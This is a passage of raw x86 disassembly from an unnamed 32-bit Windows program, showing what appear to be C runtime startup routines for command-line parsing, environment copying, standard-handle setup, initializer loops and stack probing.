  424b30:	add    esi,ebp
  424b32:	cmp    BYTE PTR [esi],bl
  424b34:	jne    0x424b08
  424b36:	push   DWORD PTR ds:0x467074
  424b3c:	call   0x425e9a
  424b41:	mov    DWORD PTR ds:0x467074,ebx
  424b47:	mov    DWORD PTR [edi],ebx
  424b49:	mov    DWORD PTR ds:0x467820,0x1
  424b53:	xor    eax,eax
  424b55:	pop    ecx
  424b56:	pop    ebp
  424b57:	pop    edi
  424b58:	pop    esi
  424b59:	pop    ebx
  424b5a:	ret    
  424b5b:	push   DWORD PTR ds:0x4670a4
  424b61:	call   0x425e9a
  424b66:	mov    DWORD PTR ds:0x4670a4,ebx
  424b6c:	or     eax,0xffffffff
  424b6f:	jmp    0x424b55
  424b71:	push   ebp
  424b72:	mov    ebp,esp
  424b74:	push   ecx
  424b75:	push   ebx
  424b76:	mov    ebx,DWORD PTR [ebp+0xc]
  424b79:	xor    edx,edx
  424b7b:	cmp    DWORD PTR [ebp+0x8],edx
  424b7e:	push   edi
  424b7f:	mov    DWORD PTR [esi],edx
  424b81:	mov    edi,ecx
  424b83:	mov    DWORD PTR [ebx],0x1
  424b89:	je     0x424b94
  424b8b:	mov    ecx,DWORD PTR [ebp+0x8]
  424b8e:	add    DWORD PTR [ebp+0x8],0x4
  424b92:	mov    DWORD PTR [ecx],edi
  424b94:	cmp    BYTE PTR [eax],0x22
  424b97:	jne    0x424ba7
  424b99:	xor    ecx,ecx
  424b9b:	test   edx,edx
  424b9d:	sete   cl
  424ba0:	inc    eax
  424ba1:	mov    edx,ecx
  424ba3:	mov    cl,0x22
  424ba5:	jmp    0x424bd4
  424ba7:	inc    DWORD PTR [esi]
  424ba9:	test   edi,edi
  424bab:	je     0x424bb2
  424bad:	mov    cl,BYTE PTR [eax]
  424baf:	mov    BYTE PTR [edi],cl
  424bb1:	inc    edi
  424bb2:	mov    cl,BYTE PTR [eax]
  424bb4:	movzx  ebx,cl
  424bb7:	inc    eax
  424bb8:	test   BYTE PTR [ebx+0x4674e1],0x4
  424bbf:	je     0x424bcd
  424bc1:	inc    DWORD PTR [esi]
  424bc3:	test   edi,edi
  424bc5:	je     0x424bcc
  424bc7:	mov    bl,BYTE PTR [eax]
  424bc9:	mov    BYTE PTR [edi],bl
  424bcb:	inc    edi
  424bcc:	inc    eax
  424bcd:	test   cl,cl
  424bcf:	mov    ebx,DWORD PTR [ebp+0xc]
  424bd2:	je     0x424c06
  424bd4:	test   edx,edx
  424bd6:	jne    0x424b94
  424bd8:	cmp    cl,0x20
  424bdb:	je     0x424be2
  424bdd:	cmp    cl,0x9
  424be0:	jne    0x424b94
  424be2:	test   edi,edi
  424be4:	je     0x424bea
  424be6:	and    BYTE PTR [edi-0x1],0x0
  424bea:	and    DWORD PTR [ebp-0x4],0x0
  424bee:	cmp    BYTE PTR [eax],0x0
  424bf1:	je     0x424ccd
  424bf7:	mov    cl,BYTE PTR [eax]
  424bf9:	cmp    cl,0x20
  424bfc:	je     0x424c03
  424bfe:	cmp    cl,0x9
  424c01:	jne    0x424c09
  424c03:	inc    eax
  424c04:	jmp    0x424bf7
  424c06:	dec    eax
  424c07:	jmp    0x424bea
  424c09:	cmp    BYTE PTR [eax],0x0
  424c0c:	je     0x424ccd
  424c12:	cmp    DWORD PTR [ebp+0x8],0x0
  424c16:	je     0x424c21
  424c18:	mov    ecx,DWORD PTR [ebp+0x8]
  424c1b:	add    DWORD PTR [ebp+0x8],0x4
  424c1f:	mov    DWORD PTR [ecx],edi
  424c21:	inc    DWORD PTR [ebx]
  424c23:	xor    ebx,ebx
  424c25:	inc    ebx
  424c26:	xor    edx,edx
  424c28:	jmp    0x424c2c
  424c2a:	inc    eax
  424c2b:	inc    edx
  424c2c:	cmp    BYTE PTR [eax],0x5c
  424c2f:	je     0x424c2a
  424c31:	cmp    BYTE PTR [eax],0x22
  424c34:	jne    0x424c5c
  424c36:	test   dl,0x1
  424c39:	jne    0x424c5a
  424c3b:	cmp    DWORD PTR [ebp-0x4],0x0
  424c3f:	je     0x424c4d
  424c41:	lea    ecx,[eax+0x1]
  424c44:	cmp    BYTE PTR [ecx],0x22
  424c47:	jne    0x424c4d
  424c49:	mov    eax,ecx
  424c4b:	jmp    0x424c4f
  424c4d:	xor    ebx,ebx
  424c4f:	xor    ecx,ecx
  424c51:	cmp    DWORD PTR [ebp-0x4],ecx
  424c54:	sete   cl
  424c57:	mov    DWORD PTR [ebp-0x4],ecx
  424c5a:	shr    edx,1
  424c5c:	test   edx,edx
  424c5e:	je     0x424c6d
  424c60:	test   edi,edi
  424c62:	je     0x424c68
  424c64:	mov    BYTE PTR [edi],0x5c
  424c67:	inc    edi
  424c68:	inc    DWORD PTR [esi]
  424c6a:	dec    edx
  424c6b:	jne    0x424c60
  424c6d:	mov    cl,BYTE PTR [eax]
  424c6f:	test   cl,cl
  424c71:	je     0x424cbb
  424c73:	cmp    DWORD PTR [ebp-0x4],0x0
  424c77:	jne    0x424c83
  424c79:	cmp    cl,0x20
  424c7c:	je     0x424cbb
  424c7e:	cmp    cl,0x9
  424c81:	je     0x424cbb
  424c83:	test   ebx,ebx
  424c85:	je     0x424cb5
  424c87:	test   edi,edi
  424c89:	je     0x424ca4
  424c8b:	movzx  edx,cl
  424c8e:	test   BYTE PTR [edx+0x4674e1],0x4
  424c95:	je     0x424c9d
  424c97:	mov    BYTE PTR [edi],cl
  424c99:	inc    edi
  424c9a:	inc    eax
  424c9b:	inc    DWORD PTR [esi]
  424c9d:	mov    cl,BYTE PTR [eax]
  424c9f:	mov    BYTE PTR [edi],cl
  424ca1:	inc    edi
  424ca2:	jmp    0x424cb3
  424ca4:	movzx  ecx,cl
  424ca7:	test   BYTE PTR [ecx+0x4674e1],0x4
  424cae:	je     0x424cb3
  424cb0:	inc    eax
  424cb1:	inc    DWORD PTR [esi]
  424cb3:	inc    DWORD PTR [esi]
  424cb5:	inc    eax
  424cb6:	jmp    0x424c23
  424cbb:	test   edi,edi
  424cbd:	je     0x424cc3
  424cbf:	and    BYTE PTR [edi],0x0
  424cc2:	inc    edi
  424cc3:	inc    DWORD PTR [esi]
  424cc5:	mov    ebx,DWORD PTR [ebp+0xc]
  424cc8:	jmp    0x424bee
  424ccd:	mov    eax,DWORD PTR [ebp+0x8]
  424cd0:	test   eax,eax
  424cd2:	je     0x424cd7
  424cd4:	and    DWORD PTR [eax],0x0
  424cd7:	inc    DWORD PTR [ebx]
  424cd9:	pop    edi
  424cda:	pop    ebx
  424cdb:	leave  
  424cdc:	ret    
  424cdd:	push   ebp
  424cde:	mov    ebp,esp
  424ce0:	push   ecx
  424ce1:	push   ecx
  424ce2:	push   ebx
  424ce3:	push   esi
  424ce4:	push   edi
  424ce5:	xor    edi,edi
  424ce7:	cmp    DWORD PTR ds:0x46782c,edi
  424ced:	jne    0x424cf4
  424cef:	call   0x425e7c
  424cf4:	and    BYTE PTR ds:0x4671d4,0x0
  424cfb:	push   0x104
  424d00:	mov    esi,0x4670d0
  424d05:	push   esi
  424d06:	push   edi
  424d07:	call   DWORD PTR ds:0x429084
  424d0d:	mov    eax,ds:0x467834
  424d12:	cmp    eax,edi
  424d14:	mov    DWORD PTR ds:0x4670b4,esi
  424d1a:	je     0x424d23
  424d1c:	cmp    BYTE PTR [eax],0x0
  424d1f:	mov    ebx,eax
  424d21:	jne    0x424d25
  424d23:	mov    ebx,esi
  424d25:	lea    eax,[ebp-0x4]
  424d28:	push   eax
  424d29:	push   edi
  424d2a:	lea    esi,[ebp-0x8]
  424d2d:	xor    ecx,ecx
  424d2f:	mov    eax,ebx
  424d31:	call   0x424b71
  424d36:	mov    esi,DWORD PTR [ebp-0x4]
  424d39:	mov    eax,DWORD PTR [ebp-0x8]
  424d3c:	shl    esi,0x2
  424d3f:	add    eax,esi
  424d41:	push   eax
  424d42:	call   0x425fb2
  424d47:	mov    edi,eax
  424d49:	add    esp,0xc
  424d4c:	test   edi,edi
  424d4e:	jne    0x424d55
  424d50:	or     eax,0xffffffff
  424d53:	jmp    0x424d7a
  424d55:	lea    eax,[ebp-0x4]
  424d58:	push   eax
  424d59:	lea    ecx,[esi+edi*1]
  424d5c:	push   edi
  424d5d:	lea    esi,[ebp-0x8]
  424d60:	mov    eax,ebx
  424d62:	call   0x424b71
  424d67:	mov    eax,DWORD PTR [ebp-0x4]
  424d6a:	dec    eax
  424d6b:	pop    ecx
  424d6c:	mov    ds:0x467098,eax
  424d71:	pop    ecx
  424d72:	mov    DWORD PTR ds:0x46709c,edi
  424d78:	xor    eax,eax
  424d7a:	pop    edi
  424d7b:	pop    esi
  424d7c:	pop    ebx
  424d7d:	leave  
  424d7e:	ret    
  424d7f:	push   ecx
  424d80:	push   ecx
  424d81:	mov    eax,ds:0x4671d8
  424d86:	push   ebx
  424d87:	push   ebp
  424d88:	push   esi
  424d89:	push   edi
  424d8a:	mov    edi,DWORD PTR ds:0x42909c
  424d90:	xor    ebx,ebx
  424d92:	xor    esi,esi
  424d94:	cmp    eax,ebx
  424d96:	push   0x2
  424d98:	pop    ebp
  424d99:	jne    0x424dc8
  424d9b:	call   edi
  424d9d:	mov    esi,eax
  424d9f:	cmp    esi,ebx
  424da1:	je     0x424daf
  424da3:	mov    DWORD PTR ds:0x4671d8,0x1
  424dad:	jmp    0x424dcd
  424daf:	call   DWORD PTR ds:0x429034
  424db5:	cmp    eax,0x78
  424db8:	jne    0x424dc3
  424dba:	mov    eax,ebp
  424dbc:	mov    ds:0x4671d8,eax
  424dc1:	jmp    0x424dc8
  424dc3:	mov    eax,ds:0x4671d8
  424dc8:	cmp    eax,0x1
  424dcb:	jne    0x424e4a
  424dcd:	cmp    esi,ebx
  424dcf:	jne    0x424dd9
  424dd1:	call   edi
  424dd3:	mov    esi,eax
  424dd5:	cmp    esi,ebx
  424dd7:	je     0x424e52
  424dd9:	cmp    WORD PTR [esi],bx
  424ddc:	mov    eax,esi
  424dde:	je     0x424dee
  424de0:	add    eax,ebp
  424de2:	cmp    WORD PTR [eax],bx
  424de5:	jne    0x424de0
  424de7:	add    eax,ebp
  424de9:	cmp    WORD PTR [eax],bx
  424dec:	jne    0x424de0
  424dee:	mov    edi,DWORD PTR ds:0x429098
  424df4:	push   ebx
  424df5:	push   ebx
  424df6:	push   ebx
  424df7:	sub    eax,esi
  424df9:	push   ebx
  424dfa:	sar    eax,1
  424dfc:	inc    eax
  424dfd:	push   eax
  424dfe:	push   esi
  424dff:	push   ebx
  424e00:	push   ebx
  424e01:	mov    DWORD PTR [esp+0x34],eax
  424e05:	call   edi
  424e07:	mov    ebp,eax
  424e09:	cmp    ebp,ebx
  424e0b:	je     0x424e3f
  424e0d:	push   ebp
  424e0e:	call   0x425fb2
  424e13:	cmp    eax,ebx
  424e15:	pop    ecx
  424e16:	mov    DWORD PTR [esp+0x10],eax
  424e1a:	je     0x424e3f
  424e1c:	push   ebx
  424e1d:	push   ebx
  424e1e:	push   ebp
  424e1f:	push   eax
  424e20:	push   DWORD PTR [esp+0x24]
  424e24:	push   esi
  424e25:	push   ebx
  424e26:	push   ebx
  424e27:	call   edi
  424e29:	test   eax,eax
  424e2b:	jne    0x424e3b
  424e2d:	push   DWORD PTR [esp+0x10]
  424e31:	call   0x425e9a
  424e36:	pop    ecx
  424e37:	mov    DWORD PTR [esp+0x10],ebx
  424e3b:	mov    ebx,DWORD PTR [esp+0x10]
  424e3f:	push   esi
  424e40:	call   DWORD PTR ds:0x429094
  424e46:	mov    eax,ebx
  424e48:	jmp    0x424e9a
  424e4a:	cmp    eax,ebp
  424e4c:	je     0x424e56
  424e4e:	cmp    eax,ebx
  424e50:	je     0x424e56
  424e52:	xor    eax,eax
  424e54:	jmp    0x424e9a
  424e56:	call   DWORD PTR ds:0x429090
  424e5c:	mov    esi,eax
  424e5e:	cmp    esi,ebx
  424e60:	je     0x424e52
  424e62:	cmp    BYTE PTR [esi],bl
  424e64:	je     0x424e70
  424e66:	inc    eax
  424e67:	cmp    BYTE PTR [eax],bl
  424e69:	jne    0x424e66
  424e6b:	inc    eax
  424e6c:	cmp    BYTE PTR [eax],bl
  424e6e:	jne    0x424e66
  424e70:	sub    eax,esi
  424e72:	inc    eax
  424e73:	mov    ebp,eax
  424e75:	push   ebp
  424e76:	call   0x425fb2
  424e7b:	mov    edi,eax
  424e7d:	cmp    edi,ebx
  424e7f:	pop    ecx
  424e80:	jne    0x424e86
  424e82:	xor    edi,edi
  424e84:	jmp    0x424e91
  424e86:	push   ebp
  424e87:	push   esi
  424e88:	push   edi
  424e89:	call   0x425fd0
  424e8e:	add    esp,0xc
  424e91:	push   esi
  424e92:	call   DWORD PTR ds:0x42908c
  424e98:	mov    eax,edi
  424e9a:	pop    edi
  424e9b:	pop    esi
  424e9c:	pop    ebp
  424e9d:	pop    ebx
  424e9e:	pop    ecx
  424e9f:	pop    ecx
  424ea0:	ret    
  424ea1:	sub    esp,0x48
  424ea4:	push   ebx
  424ea5:	mov    ebx,0x480
  424eaa:	push   ebx
  424eab:	call   0x425fb2
  424eb0:	test   eax,eax
  424eb2:	pop    ecx
  424eb3:	jne    0x424ebd
  424eb5:	or     eax,0xffffffff
  424eb8:	jmp    0x42509a
  424ebd:	mov    ds:0x467720,eax
  424ec2:	mov    DWORD PTR ds:0x467708,0x20
  424ecc:	lea    ecx,[eax+0x480]
  424ed2:	jmp    0x424ef2
  424ed4:	and    BYTE PTR [eax+0x4],0x0
  424ed8:	or     DWORD PTR [eax],0xffffffff
  424edb:	and    DWORD PTR [eax+0x8],0x0
  424edf:	mov    BYTE PTR [eax+0x5],0xa
  424ee3:	mov    ecx,DWORD PTR ds:0x467720
  424ee9:	add    eax,0x24
  424eec:	add    ecx,0x480
  424ef2:	cmp    eax,ecx
  424ef4:	jb     0x424ed4
  424ef6:	push   ebp
  424ef7:	push   esi
  424ef8:	push   edi
  424ef9:	lea    eax,[esp+0x14]
  424efd:	push   eax
  424efe:	call   DWORD PTR ds:0x429064
  424f04:	cmp    WORD PTR [esp+0x46],0x0
  424f0a:	je     0x424ff9
  424f10:	mov    eax,DWORD PTR [esp+0x48]
  424f14:	test   eax,eax
  424f16:	je     0x424ff9
  424f1c:	mov    edi,DWORD PTR [eax]
  424f1e:	lea    ebp,[eax+0x4]
  424f21:	lea    eax,[edi+ebp*1]
  424f24:	mov    DWORD PTR [esp+0x10],eax
  424f28:	mov    eax,0x800
  424f2d:	cmp    edi,eax
  424f2f:	jl     0x424f33
  424f31:	mov    edi,eax
  424f33:	cmp    DWORD PTR ds:0x467708,edi
  424f39:	jge    0x424f89
  424f3b:	mov    esi,0x467724
  424f40:	push   ebx
  424f41:	call   0x425fb2
  424f46:	test   eax,eax
  424f48:	pop    ecx
  424f49:	je     0x424f83
  424f4b:	add    DWORD PTR ds:0x467708,0x20
  424f52:	mov    DWORD PTR [esi],eax
  424f54:	lea    ecx,[eax+0x480]
  424f5a:	jmp    0x424f72
  424f5c:	and    BYTE PTR [eax+0x4],0x0
  424f60:	or     DWORD PTR [eax],0xffffffff
  424f63:	and    DWORD PTR [eax+0x8],0x0
  424f67:	mov    BYTE PTR [eax+0x5],0xa
  424f6b:	mov    ecx,DWORD PTR [esi]
  424f6d:	add    eax,0x24
  424f70:	add    ecx,ebx
  424f72:	cmp    eax,ecx
  424f74:	jb     0x424f5c
  424f76:	add    esi,0x4
  424f79:	cmp    DWORD PTR ds:0x467708,edi
  424f7f:	jl     0x424f40
  424f81:	jmp    0x424f89
  424f83:	mov    edi,DWORD PTR ds:0x467708
  424f89:	xor    ebx,ebx
  424f8b:	test   edi,edi
  424f8d:	jle    0x424ff9
  424f8f:	mov    eax,DWORD PTR [esp+0x10]
  424f93:	mov    eax,DWORD PTR [eax]
  424f95:	cmp    eax,0xffffffff
  424f98:	je     0x424fee
  424f9a:	mov    cl,BYTE PTR [ebp+0x0]
  424f9d:	test   cl,0x1
  424fa0:	je     0x424fee
  424fa2:	test   cl,0x8
  424fa5:	jne    0x424fb2
  424fa7:	push   eax
  424fa8:	call   DWORD PTR ds:0x4290a4
  424fae:	test   eax,eax
  424fb0:	je     0x424fee
  424fb2:	mov    ecx,ebx
  424fb4:	mov    eax,ebx
  424fb6:	and    eax,0x1f
  424fb9:	lea    eax,[eax+eax*8]
  424fbc:	sar    ecx,0x5
  424fbf:	mov    ecx,DWORD PTR [ecx*4+0x467720]
  424fc6:	lea    esi,[ecx+eax*4]
  424fc9:	mov    eax,DWORD PTR [esp+0x10]
  424fcd:	mov    eax,DWORD PTR [eax]
  424fcf:	mov    DWORD PTR [esi],eax
  424fd1:	mov    al,BYTE PTR [ebp+0x0]
  424fd4:	mov    BYTE PTR [esi+0x4],al
  424fd7:	lea    eax,[esi+0xc]
  424fda:	push   0xfa0
  424fdf:	push   eax
  424fe0:	call   0x42631d
  424fe5:	test   eax,eax
  424fe7:	pop    ecx
  424fe8:	pop    ecx
  424fe9:	je     0x425019
  424feb:	inc    DWORD PTR [esi+0x8]
  424fee:	add    DWORD PTR [esp+0x10],0x4
  424ff3:	inc    ebx
  424ff4:	inc    ebp
  424ff5:	cmp    ebx,edi
  424ff7:	jl     0x424f8f
  424ff9:	xor    ebx,ebx
  424ffb:	mov    ecx,DWORD PTR ds:0x467720
  425001:	lea    eax,[ebx+ebx*8]
  425004:	lea    esi,[ecx+eax*4]
  425007:	cmp    DWORD PTR [esi],0xffffffff
  42500a:	jne    0x42507b
  42500c:	test   ebx,ebx
  42500e:	mov    BYTE PTR [esi+0x4],0x81
  425012:	jne    0x42501e
  425014:	push   0xfffffff6
  425016:	pop    eax
  425017:	jmp    0x425028
  425019:	or     eax,0xffffffff
  42501c:	jmp    0x425097
  42501e:	mov    eax,ebx
  425020:	dec    eax
  425021:	neg    eax
  425023:	sbb    eax,eax
  425025:	add    eax,0xfffffff5
  425028:	push   eax
  425029:	call   DWORD PTR ds:0x429080
  42502f:	mov    edi,eax
  425031:	cmp    edi,0xffffffff
  425034:	je     0x425075
  425036:	push   edi
  425037:	call   DWORD PTR ds:0x4290a4
  42503d:	test   eax,eax
  42503f:	je     0x425075
  425041:	and    eax,0xff
  425046:	cmp    eax,0x2
  425049:	mov    DWORD PTR [esi],edi
  42504b:	jne    0x425053
  42504d:	or     BYTE PTR [esi+0x4],0x40
  425051:	jmp    0x42505c
  425053:	cmp    eax,0x3
  425056:	jne    0x42505c
  425058:	or     BYTE PTR [esi+0x4],0x8
  42505c:	lea    eax,[esi+0xc]
  42505f:	push   0xfa0
  425064:	push   eax
  425065:	call   0x42631d
  42506a:	test   eax,eax
  42506c:	pop    ecx
  42506d:	pop    ecx
  42506e:	je     0x425019
  425070:	inc    DWORD PTR [esi+0x8]
  425073:	jmp    0x42507f
  425075:	or     BYTE PTR [esi+0x4],0x40
  425079:	jmp    0x42507f
  42507b:	or     BYTE PTR [esi+0x4],0x80
  42507f:	inc    ebx
  425080:	cmp    ebx,0x3
  425083:	jl     0x424ffb
  425089:	push   DWORD PTR ds:0x467708
  42508f:	call   DWORD PTR ds:0x4290a0
  425095:	xor    eax,eax
  425097:	pop    edi
  425098:	pop    esi
  425099:	pop    ebp
  42509a:	pop    ebx
  42509b:	add    esp,0x48
  42509e:	ret    
  42509f:	push   0xc
  4250a1:	push   0x429500
  4250a6:	call   0x425290
  4250ab:	mov    DWORD PTR [ebp-0x1c],0x429f58
  4250b2:	cmp    DWORD PTR [ebp-0x1c],0x429f58
  4250b9:	jae    0x4250dd
  4250bb:	and    DWORD PTR [ebp-0x4],0x0
  4250bf:	mov    eax,DWORD PTR [ebp-0x1c]
  4250c2:	mov    eax,DWORD PTR [eax]
  4250c4:	test   eax,eax
  4250c6:	je     0x4250d3
  4250c8:	call   eax
  4250ca:	jmp    0x4250d3
  4250cc:	xor    eax,eax
  4250ce:	inc    eax
  4250cf:	ret    
  4250d0:	mov    esp,DWORD PTR [ebp-0x18]
  4250d3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4250d7:	add    DWORD PTR [ebp-0x1c],0x4
  4250db:	jmp    0x4250b2
  4250dd:	call   0x4252cb
  4250e2:	ret    
  4250e3:	push   0xc
  4250e5:	push   0x429510
  4250ea:	call   0x425290
  4250ef:	mov    DWORD PTR [ebp-0x1c],0x429f60
  4250f6:	cmp    DWORD PTR [ebp-0x1c],0x429f60
  4250fd:	jae    0x425121
  4250ff:	and    DWORD PTR [ebp-0x4],0x0
  425103:	mov    eax,DWORD PTR [ebp-0x1c]
  425106:	mov    eax,DWORD PTR [eax]
  425108:	test   eax,eax
  42510a:	je     0x425117
  42510c:	call   eax
  42510e:	jmp    0x425117
  425110:	xor    eax,eax
  425112:	inc    eax
  425113:	ret    
  425114:	mov    esp,DWORD PTR [ebp-0x18]
  425117:	or     DWORD PTR [ebp-0x4],0xffffffff
  42511b:	add    DWORD PTR [ebp-0x1c],0x4
  42511f:	jmp    0x4250f6
  425121:	call   0x4252cb
  425126:	ret    
  425127:	call   0x425366
  42512c:	mov    eax,ds:0x4668bc
  425131:	cmp    eax,0xffffffff
  425134:	je     0x425144
  425136:	push   eax
  425137:	call   DWORD PTR ds:0x4290ac
  42513d:	or     DWORD PTR ds:0x4668bc,0xffffffff
  425144:	ret    
  425145:	push   ebx
  425146:	push   esi
  425147:	call   DWORD PTR ds:0x429034
  42514d:	push   DWORD PTR ds:0x4668bc
  425153:	mov    ebx,eax
  425155:	call   DWORD PTR ds:0x4290bc
  42515b:	mov    esi,eax
  42515d:	test   esi,esi
  42515f:	jne    0x4251aa
  425161:	push   0x88
  425166:	push   0x1
  425168:	call   0x4263a8
  42516d:	mov    esi,eax
  42516f:	test   esi,esi
  425171:	pop    ecx
  425172:	pop    ecx
  425173:	je     0x4251a2
  425175:	push   esi
  425176:	push   DWORD PTR ds:0x4668bc
  42517c:	call   DWORD PTR ds:0x4290b8
  425182:	test   eax,eax
  425184:	je     0x4251a2
  425186:	mov    DWORD PTR [esi+0x54],0x466810
  42518d:	mov    DWORD PTR [esi+0x14],0x1
  425194:	call   DWORD PTR ds:0x4290b4
  42519a:	or     DWORD PTR [esi+0x4],0xffffffff
  42519e:	mov    DWORD PTR [esi],eax
  4251a0:	jmp    0x4251aa
  4251a2:	push   0x10
  4251a4:	call   0x424358
  4251a9:	pop    ecx
  4251aa:	push   ebx
  4251ab:	call   DWORD PTR ds:0x4290b0
  4251b1:	mov    eax,esi
  4251b3:	pop    esi
  4251b4:	pop    ebx
  4251b5:	ret    
  4251b6:	call   0x42531d
  4251bb:	test   eax,eax
  4251bd:	je     0x4251cf
  4251bf:	call   DWORD PTR ds:0x4290c0
  4251c5:	cmp    eax,0xffffffff
  4251c8:	mov    ds:0x4668bc,eax
  4251cd:	jne    0x4251d7
  4251cf:	call   0x425127
  4251d4:	xor    eax,eax
  4251d6:	ret    
  4251d7:	push   esi
  4251d8:	push   0x88
  4251dd:	push   0x1
  4251df:	call   0x4263a8
  4251e4:	mov    esi,eax
  4251e6:	test   esi,esi
  4251e8:	pop    ecx
  4251e9:	pop    ecx
  4251ea:	je     0x42521c
  4251ec:	push   esi
  4251ed:	push   DWORD PTR ds:0x4668bc
  4251f3:	call   DWORD PTR ds:0x4290b8
  4251f9:	test   eax,eax
  4251fb:	je     0x42521c
  4251fd:	mov    DWORD PTR [esi+0x54],0x466810
  425204:	mov    DWORD PTR [esi+0x14],0x1
  42520b:	call   DWORD PTR ds:0x4290b4
  425211:	or     DWORD PTR [esi+0x4],0xffffffff
  425215:	mov    DWORD PTR [esi],eax
  425217:	xor    eax,eax
  425219:	inc    eax
  42521a:	pop    esi
  42521b:	ret    
  42521c:	call   0x425127
  425221:	xor    eax,eax
  425223:	pop    esi
  425224:	ret    
  425225:	cmp    DWORD PTR ds:0x467084,0x2
  42522c:	jne    0x42523b
  42522e:	cmp    DWORD PTR ds:0x467090,0x5
  425235:	jb     0x42523b
  425237:	xor    eax,eax
  425239:	inc    eax
  42523a:	ret    
  42523b:	push   0x3
  42523d:	pop    eax
  42523e:	ret    
  42523f:	xor    eax,eax
  425241:	cmp    DWORD PTR [esp+0x4],eax
  425245:	push   0x0
  425247:	sete   al
  42524a:	push   0x1000
  42524f:	push   eax
  425250:	call   DWORD PTR ds:0x429038
  425256:	test   eax,eax
  425258:	mov    ds:0x467700,eax
  42525d:	je     0x425289
  42525f:	call   0x425225
  425264:	cmp    eax,0x3
  425267:	mov    ds:0x467704,eax
  42526c:	jne    0x42528c
  42526e:	push   0x3f8
  425273:	call   0x42662a
  425278:	test   eax,eax
  42527a:	pop    ecx
  42527b:	jne    0x42528c
  42527d:	push   DWORD PTR ds:0x467700
  425283:	call   DWORD PTR ds:0x429020
  425289:	xor    eax,eax
  42528b:	ret    
  42528c:	xor    eax,eax
  42528e:	inc    eax
  42528f:	ret    
  425290:	push   0x427158
  425295:	mov    eax,fs:0x0
  42529b:	push   eax
  42529c:	mov    eax,DWORD PTR [esp+0x10]
  4252a0:	mov    DWORD PTR [esp+0x10],ebp
  4252a4:	lea    ebp,[esp+0x10]
  4252a8:	sub    esp,eax
  4252aa:	push   ebx
  4252ab:	push   esi
  4252ac:	push   edi
  4252ad:	mov    eax,DWORD PTR [ebp-0x8]
  4252b0:	mov    DWORD PTR [ebp-0x18],esp
  4252b3:	push   eax
  4252b4:	mov    eax,DWORD PTR [ebp-0x4]
  4252b7:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4252be:	mov    DWORD PTR [ebp-0x8],eax
  4252c1:	lea    eax,[ebp-0x10]
  4252c4:	mov    fs:0x0,eax
  4252ca:	ret    
  4252cb:	mov    ecx,DWORD PTR [ebp-0x10]
  4252ce:	mov    DWORD PTR fs:0x0,ecx
  4252d5:	pop    ecx
  4252d6:	pop    edi
  4252d7:	pop    esi
  4252d8:	pop    ebx
  4252d9:	leave  
  4252da:	push   ecx
  4252db:	ret    
  4252dc:	int3   
  4252dd:	int3   
  4252de:	int3   
  4252df:	int3   
  4252e0:	cmp    eax,0x1000
  4252e5:	jae    0x4252f5
  4252e7:	neg    eax
  4252e9:	add    eax,esp
  4252eb:	add    eax,0x4
  4252ee:	test   DWORD PTR [eax],eax
  4252f0:	xchg   esp,eax
  4252f1:	mov    eax,DWORD PTR [eax]
  4252f3:	push   eax
  4252f4:	ret    
  4252f5:	push   ecx
  4252f6:	lea    ecx,[esp+0x8]
  4252fa:	sub    ecx,0x1000
  425300:	sub    eax,0x1000
  425305:	test   DWORD PTR [ecx],eax
  425307:	cmp    eax,0x1000
  42530c:	jae    0x4252fa
  42530e:	sub    ecx,eax
  425310:	mov    eax,esp
  425312:	test   DWORD PTR [ecx],eax
  425314:	mov    esp,ecx
  425316:	mov    ecx,DWORD PTR [eax]
  425318:	mov    eax,DWORD PTR [eax+0x4]
  42531b:	push   eax
  42531c:	ret    
  42531d:	push   esi
  42531e:	push   edi
  42531f:	xor    esi,esi
  425321:	mov    edi,0x4671e0
  425326:	cmp    DWORD PTR [esi*8+0x4668d4],0x1
  42532e:	jne    0x42534e
  425330:	lea    eax,[esi*8+0x4668d0]
  425337:	mov    DWORD PTR [eax],edi
  425339:	push   0xfa0
  42533e:	push   DWORD PTR [eax]
  425340:	add    edi,0x18
  425343:	call   0x42631d
  425348:	test   eax,eax
  42534a:	pop    ecx
  42534b:	pop    ecx
  42534c:	je     0x42535a
  42534e:	inc    esi
  42534f:	cmp    esi,0x24
  425352:	jl     0x425326
  425354:	xor    eax,eax
  425356:	inc    eax
  425357:	pop    edi
  425358:	pop    esi
  425359:	ret    
  42535a:	and    DWORD PTR [esi*8+0x4668d0],0x0
  425362:	xor    eax,eax
  425364:	jmp    0x425357
  425366:	push   ebx
  425367:	mov    ebx,DWORD PTR ds:0x4290a8
  42536d:	push   esi
  42536e:	mov    esi,0x4668d0
  425373:	push   edi
  425374:	mov    edi,DWORD PTR [esi]
  425376:	test   edi,edi
  425378:	je     0x42538d
  42537a:	cmp    DWORD PTR [esi+0x4],0x1
  42537e:	je     0x42538d
  425380:	push   edi
  425381:	call   ebx
  425383:	push   edi
  425384:	call   0x425e9a
  425389:	and    DWORD PTR [esi],0x0
  42538c:	pop    ecx
  42538d:	add    esi,0x8
  425390:	cmp    esi,0x4669f0
  425396:	jl     0x425374
  425398:	mov    esi,0x4668d0
  42539d:	pop    edi
  42539e:	mov    eax,DWORD PTR [esi]
  4253a0:	test   eax,eax
  4253a2:	je     0x4253ad
  4253a4:	cmp    DWORD PTR [esi+0x4],0x1
  4253a8:	jne    0x4253ad
  4253aa:	push   eax
  4253ab:	call   ebx
  4253ad:	add    esi,0x8
  4253b0:	cmp    esi,0x4669f0
  4253b6:	jl     0x42539e
  4253b8:	pop    esi
  4253b9:	pop    ebx
  4253ba:	ret    
  4253bb:	push   ebp
  4253bc:	mov    ebp,esp
  4253be:	mov    eax,DWORD PTR [ebp+0x8]
  4253c1:	push   DWORD PTR [eax*8+0x4668d0]
  4253c8:	call   DWORD PTR ds:0x4290c4
  4253ce:	pop    ebp
  4253cf:	ret    
  4253d0:	push   ebp
  4253d1:	mov    ebp,esp
  4253d3:	push   esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x8]
  4253d7:	lea    esi,[esi*8+0x4668d0]
  4253de:	cmp    DWORD PTR [esi],0x0
  4253e1:	je     0x4253e8
  4253e3:	xor    eax,eax
  4253e5:	inc    eax
  4253e6:	jmp    0x42544c
  4253e8:	push   edi
  4253e9:	push   0x18
  4253eb:	call   0x425fb2
  4253f0:	mov    edi,eax
  4253f2:	test   edi,edi
  4253f4:	pop    ecx
  4253f5:	jne    0x425406
  4253f7:	call   0x427230
  4253fc:	mov    DWORD PTR [eax],0xc
  425402:	xor    eax,eax
  425404:	jmp    0x42544b
  425406:	push   0xa
  425408:	call   0x42544f
  42540d:	cmp    DWORD PTR [esi],0x0
  425410:	pop    ecx
